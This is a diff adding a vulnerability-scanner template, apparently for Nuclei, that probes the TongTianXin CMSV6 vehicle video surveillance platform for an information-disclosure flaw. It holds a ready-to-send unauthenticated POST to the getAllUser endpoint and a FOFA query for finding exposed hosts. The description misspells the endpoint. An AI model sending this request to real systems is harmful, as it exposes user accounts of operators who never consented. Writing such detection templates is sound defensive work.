@@ -1,0 +1,31 @@
+id: TongTianXin-CMS-Information-disclosure
+
+info:
+  name: 通天星CMSV6 车载视频监控平台 信息泄露漏
+  author: changge
+  severity: high
+  description: |
+    通天星CMSV6车载视频监控平台 StandardLoginAction getAlser.acion接口处存在信息泄露漏洞。
+  metadata:
+    fofa-query: body="/808gps/"
+  reference:
+    - https://127.0.0.1
+  tags: cms,tongtianxin,Information disclosure
+
+http:
+  - raw:
+      - |
+        POST /808gps/StandardLoginAction_getAllUser.action HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        json=null
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
